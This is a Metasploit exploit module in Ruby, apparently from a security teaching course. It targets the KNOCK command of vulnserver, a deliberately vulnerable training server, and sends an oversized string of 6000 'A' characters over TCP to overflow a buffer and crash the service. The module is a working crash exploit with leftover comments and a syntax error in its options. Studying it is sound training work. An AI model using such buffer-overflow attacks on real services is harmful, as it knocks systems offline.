##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
##
# This module exploits the KNOCK command of vulnserver
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	# Name of the target
      'Description'    => %q{	
         vulnserver is intentially written vulnerable. This exploits a vulnerability in the server to crash it by overwriting the return address with garbage values.
      },
      'Author'         => [ 'fxw', 'GenCyber'],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'RPORT' = 9999 #dont need LPORT, as we are not sending a payload
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done # Likely dont need this
        },      
      'Payload'        =>	# How to encode and generate the payload #Remove once Auxilary Module Parent is used.
        {
 #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits # May not need, will removed once Ive tested that
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0, #may not need, remove once tested 
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
  end

  def exploit	# Actual exploit # change to run when auxilry parent is used
    print_status("Connecting to target...")
    connect	# Connect to the target

#    sock.get_once # poll the connection and see availability of any read data one time
	  
    outbound = "KNOCK /.:/" + "A"*6000

    print_status("Trying target #{target.name}...")

    sock.put(outbound)	# Send the attacking payload
  
    #use ensure block.
    disconnect	# disconnect the connection
  end
end
